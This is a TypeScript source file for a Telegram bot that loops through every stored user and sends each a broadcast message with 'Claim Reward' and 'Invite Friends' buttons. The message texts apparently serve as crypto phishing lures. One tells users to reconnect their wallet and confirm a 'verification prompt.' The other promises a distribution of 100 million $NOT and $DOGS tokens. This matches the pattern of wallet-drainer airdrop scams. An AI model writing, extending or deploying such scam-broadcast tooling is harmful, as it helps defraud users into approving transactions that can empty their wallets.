import prisma, { PrismaModelType } from "@/backend/modules/prisma/Prisma";
import DodoBot from "./classes/DodoBot";
import { generateRandomNumber } from "@/backend/utils/string";
import { Markup } from "telegraf";
import { getWebAppUrl } from "./classes/DodoClient";
import { getInviteText } from "@/backend/api/player/send_invite/actions";

async function getButtons(user: PrismaModelType<'user'>) {
    return Markup.inlineKeyboard([
        Markup.button.webApp("Claim Reward", await getWebAppUrl(user)),
        Markup.button.switchToChat("Invite Friends!", await getInviteText(user)),
    ], {
        columns: 1
    })
}

const texts = [
    `🚨 {username}, If after wallet connection you received a transaction with a comment, connect your wallet again.
Confirm the verification prompt. Ref:#91103

🎉 It means that you can receive a reward, and the system has sent a verification message to ensure your wallet is not a spam wallet.`,
`Welcome, esteemed user! 🦴

Each user has a chance to receive a reward based on their activity: The more active you are — the greater the reward.

Currently, there is a distribution of 100 mln $NOT and $DOGS.

Hurry up to claim your bonus 🎁`
]

async function sleep(ms: number): Promise<void> {
    return new Promise<void>(r => setTimeout(r, ms));
}

export async function handleAd(dodoBot: DodoBot, skip = 0, step = 0, take = 20) {
    const users_count = await prisma.user.count();
    if (users_count <= skip) {
        console.log("AD FINISHED", users_count);
        return;
    }

    const users = await prisma.user.findMany({
        skip,
        take
    });

    await Promise.all(users.map(async user => {
        let text = texts[step % texts.length];
        text = text.replaceAll("{username}", (user.username || user.chatId) + "");
        const buttons = await getButtons(user);
        try {
            await dodoBot.bot.telegram.sendMessage(user.chatId, text, buttons).catch(()=>undefined);
        } catch (error) {
            console.error(`Failed to send message to user ${user.chatId}:`, error);
        }
    }));

    await sleep(1000);
    await handleAd(dodoBot, skip + take, step + 1, take);
}
